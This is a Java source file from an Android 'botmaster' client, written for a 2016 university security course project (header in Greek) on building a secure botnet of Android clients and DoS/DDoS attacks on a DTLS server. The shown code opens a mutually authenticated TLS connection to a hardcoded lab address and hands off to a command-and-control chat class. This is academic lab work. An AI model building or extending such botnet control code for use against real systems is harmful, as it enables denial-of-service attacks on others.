package botnet.botmasterandroidclient;
/**
 *                     Πανεπιστήμιο Αιγαίου
 *      Τμήμα Μηχανικών Πληροφοριακών & Επικοινωνιακών Συστημάτων
 *
 *          Ασφάλεια Ασύρματων & Κινητών Δικτύων Επικοινωνιών
 *                     Εαρινό Εξάμηνο 2016
 *                      Project Μαθήματος
 *
 * Δημιουργία secure botnet με android clients & Dos/DDoS σε DTLS Server.
 *
 *          Πέππας Κωνσταντίνος 321/2011134 - icsd11134@icsd.aegean.gr
 *          Σωτηρέλης Χρήστος   321/2012182 - icsd12182@icsd.aegean.gr
 *          Χαϊκάλης Νικόλαος   321/2012200 - icsd12200@icsd.aegean.gr
 *
 *          Καθηγητής Μαθήματος: Γ. Καμπουράκης
 *
 */
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.UnknownHostException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManagerFactory;

public class MainActivity extends AppCompatActivity implements Serializable {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Thread thread = new Thread(new Runnable(){
            @Override
            public void run() {
                try {
                    SSLSocket socket;
                    Certificates ca = new Certificates("BotMasterAndroid", getApplicationContext());
                    KeyManagerFactory BMasterKeyManager = ca.FindPubKey();
                    TrustManagerFactory trustManager = ca.FindCaKey();

                    // Use keys to create SSLSocket
                    SSLContext ssl = SSLContext.getInstance("TLS");
                    ssl.init(BMasterKeyManager.getKeyManagers(), trustManager.getTrustManagers(), SecureRandom.getInstance("SHA1PRNG"));
                    socket = (SSLSocket) ssl.getSocketFactory().createSocket("192.168.1.2", 5555);
                    Log.d("Debug:", "123");
                    System.setProperty("javax.net.debug", "ssl:record");
                    socket.startHandshake();

                    ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
                    ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                    oos.writeObject("Hello Server");
                    Log.d("msg from server: ", ois.readObject().toString());
                    ChatWithCC bot = new ChatWithCC(oos, ois);
                    bot.StartChating();
                } catch (NoSuchAlgorithmException ex) {
                    Logger.getLogger(MainActivity.class.getName()).log(Level.SEVERE, null, ex);
                } catch (KeyManagementException ex) {
                    Logger.getLogger(MainActivity.class.getName()).log(Level.SEVERE, null, ex);
                } catch (UnknownHostException ex) {
                    Logger.getLogger(MainActivity.class.getName()).log(Level.SEVERE, null, ex);
                } catch (IOException ex) {
                    Logger.getLogger(MainActivity.class.getName()).log(Level.SEVERE, null, ex);
                } catch (ClassNotFoundException e) {
                    e.printStackTrace();
                }
            }
        });
        thread.start();


    }
}